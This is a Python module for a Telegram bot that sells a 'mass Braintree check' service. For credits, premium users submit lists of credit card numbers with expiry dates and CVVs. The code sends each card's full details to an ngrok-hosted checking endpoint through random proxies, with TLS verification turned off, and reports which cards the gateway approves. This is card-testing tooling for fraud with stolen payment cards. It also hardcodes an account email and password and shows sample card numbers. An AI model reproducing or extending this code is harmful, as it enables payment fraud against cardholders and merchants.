import sys
import os
import time
import requests
import json
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.database import get_credits, set_credits, get_plan, is_premium
from utils.bin_database import get_bin_info
from config import ADMIN_ID
from config import get_random_proxy

def setup_mass_b3_check_command(bot):
    @bot.message_handler(commands=['mb3'])
    def mass_b3_check_command(message):
        print(f"🔹 Comando /mb3 recibido de {message.from_user.first_name}")
        process_mass_b3_check(bot, message)

def process_mass_b3_check(bot, message):
    user_id = message.from_user.id
    username = message.from_user.first_name
    
    # Solo para usuarios premium
    if not is_premium(user_id):
        bot.reply_to(message, "❌ Comando solo para usuarios premium.\n@Dunxito para adquirir tu plan.")
        return
    
    # Verificar créditos
    credits = get_credits(user_id)
    if credits <= 0:
        bot.reply_to(message, "❌ Créditos insuficientes.")
        return
    
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "⚠️ Uso: `/mb3 <lista_de_tarjetas>`\nEjemplo: `/mb3 4282104033002891|11|29|500 5104886655308541|09|29|094`\n\n📊 **Límites:**\n• Mínimo: 2 tarjetas\n• Máximo: 10 tarjetas\n\n💳 **Costos:**\n• 1 crédito por tarjeta", parse_mode="Markdown")
            return
        
        cards = parts[1:]
        
        # Validar mínimo 2 tarjetas
        if len(cards) < 2:
            bot.reply_to(message, "❌ Se necesitan 2 tarjetas como mínimo.")
            return
        
        # Limitar a 10 tarjetas máximo
        if len(cards) > 10:
            cards = cards[:10]
            bot.reply_to(message, f"⚠️ Se procesarán solo las primeras 10 tarjetas")
        
        # Verificar créditos
        total_cost = len(cards)
        if credits < total_cost:
            bot.reply_to(message, f"❌ Necesitas {total_cost} créditos para {len(cards)} tarjetas")
            return
        
        processing_msg = bot.reply_to(message, f"🔄 Procesando {len(cards)} tarjetas en Braintree...")
        
        start_time = time.time()
        results = []
        approved_cards = 0
        
        for i, card_data in enumerate(cards, 1):
            try:
                result, is_approved = process_single_b3_card(card_data, i)
                results.append(result)
                if is_approved:
                    approved_cards += 1
                
                if i % 2 == 0:
                    bot.edit_message_text(f"🔄 Procesando... {i}/{len(cards)}", message.chat.id, processing_msg.message_id)
                    
            except Exception as e:
                results.append(f"❌ Tarjeta {i}: Error")
        
        # Restar créditos
        new_credits = credits - total_cost
        set_credits(user_id, new_credits)
        
        end_time = time.time()
        total_time = round(end_time - start_time, 2)
        plan = get_plan(user_id, new_credits)
        
        bot.delete_message(message.chat.id, processing_msg.message_id)
        
        response_text = f"""
- - - - - - - - - - - - - - - - - - - - -
 Mass Braintree Check
- - - - - - - - - - - - - - - - - - - - - 
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➙ Braintree CCN
- - - - - - - - - - - - - - - - - - - - - 

{"\n".join(results)}

- - - - - - - - - - - - - - - - - - - - -
🝮 Total : {len(cards)} tarjetas
🝮 Approved : {approved_cards} tarjetas
🝮 Costo : {total_cost} créditos (1 por tarjeta)
🝮 Time : {total_time}s
🝮 Credits Left : {new_credits}
🝮 Checked by : {username} [{plan}]
"""
        bot.reply_to(message, response_text)
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

def process_single_b3_card(card_data, card_number):
    try:
        if '|' not in card_data:
            return f"❌ Tarjeta {card_number}: Formato incorrecto", False
        
        card_parts = card_data.split('|')
        if len(card_parts) != 4:
            return f"❌ Tarjeta {card_number}: Formato incorrecto", False
        
        cc_number, expiry_month, expiry_year, cvv = card_parts
        
        # Validaciones básicas
        if not (cc_number.isdigit() and len(cc_number) == 16):
            return f"❌ Tarjeta {card_number}: Número inválido", False
            
        if len(expiry_year) == 2:
            formatted_year = expiry_year
        elif len(expiry_year) == 4:
            formatted_year = expiry_year[2:]
        else:
            return f"❌ Tarjeta {card_number}: Año inválido", False
        
        # URL de Braintree
        proxy = get_random_proxy()
        braintree_url = f"https://componential-unstruggling-shantel.ngrok-free.dev/check_cc?cc={cc_number}|{expiry_month}|{formatted_year}|{cvv}&email=wasdark336@gmail.com&password=bbmEZs65p!BJLNz"
        
        response = make_simple_request(braintree_url)
        
        # ✅ CORREGIDO: Extraer status y response exactos del JSON
        status = extract_status_from_response(response)
        result_message = extract_result_from_response(response)
        
        # Determinar si fue aprobada (basado en el status real)
        is_approved = "approved" in str(status).lower() or "✅" in str(status)
        
        bin_info = get_bin_info(cc_number[:6])
        
        # ✅ CORREGIDO: Formatear resultado como quieres
        # 🝮 1. 4283311523877976|06|26|122 | Declined | No account
        result_text = f"🝮 {card_number}. {cc_number}|{expiry_month}|{expiry_year}|{cvv} | {status} | {result_message}"
        
        return result_text, is_approved
    
    except Exception as e:
        return f"❌ Tarjeta {card_number}: Error", False

def make_simple_request(url):
    """Hace una solicitud simple - oculta errores técnicos"""
    try:
        response = requests.get(url, timeout=90, verify=False)
        return response.text
    except Exception:
        # ❌ NO mostrar detalles técnicos
        return "SERVER_UNAVAILABLE"

def extract_status_from_response(response):
    """Extrae EXACTAMENTE el campo 'status' del JSON"""
    if response == "SERVER_UNAVAILABLE":
        return "Gateway Offline ⚠️"
    
    try:
        data = json.loads(response)
        # ✅ EXTRAER DIRECTAMENTE el campo "status" 
        status = data.get("status", "Unknown")
        
        # Convertir \u274c a ❌ y otros emojis Unicode
        if isinstance(status, str):
            status = status.replace("\\u274c", "❌").replace("\\u2705", "✅")
        
        return str(status)
    except:
        return "Unknown"

def extract_result_from_response(response):
    """Extrae EXACTAMENTE el campo 'response' o 'error' del JSON"""
    if response == "SERVER_UNAVAILABLE":
        return "Gateway no disponible - intenta más tarde"
    
    try:
        data = json.loads(response)
        
        # ✅ PRIORIDAD 1: campo "response"
        if "response" in data and data["response"]:
            result = data["response"]
            if isinstance(result, str):
                result = result.replace("\\u274c", "❌").replace("\\u2705", "✅")
            return str(result)
        
        # ✅ PRIORIDAD 2: campo "error"  
        elif "error" in data and data["error"]:
            result = data["error"]
            if isinstance(result, str):
                result = result.replace("\\u274c", "❌").replace("\\u2705", "✅")
            return str(result)
        
        # ✅ PRIORIDAD 3: campo "message"
        elif "message" in data and data["message"]:
            result = data["message"]
            if isinstance(result, str):
                result = result.replace("\\u274c", "❌").replace("\\u2705", "✅")
            return str(result)
            
        else:
            return "No response data"
            
    except:
        return "Invalid response format"